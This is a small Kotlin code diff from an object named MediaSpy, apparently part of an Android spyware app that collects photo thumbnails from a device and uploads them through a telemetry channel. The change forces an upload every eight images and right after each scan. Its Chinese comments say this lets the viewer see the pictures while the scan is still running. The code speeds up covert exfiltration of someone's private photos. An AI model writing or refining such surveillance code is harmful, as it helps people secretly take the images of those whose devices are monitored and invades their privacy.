@@ -101,7 +101,7 @@ object MediaSpy {
                     sent++
                     // 每 8 张就推一次，不等扫完 —— 用户能边扫边看到图
                     if (sent % 8 == 0) {
-                        runCatching { Telemetry.flush(ctx) }
+                        runCatching { Telemetry.flush(ctx, true) }
                     }
                 }
             }
@@ -118,7 +118,7 @@ object MediaSpy {
         }
         // 扫完立刻推，不等下一轮心跳（原来要等最多 20 秒）
         if (sent > 0) {
-            runCatching { Telemetry.flush(ctx) }
+            runCatching { Telemetry.flush(ctx, true) }
             Log.i(TAG, "queued $sent thumbs, flushed")
         }
     }
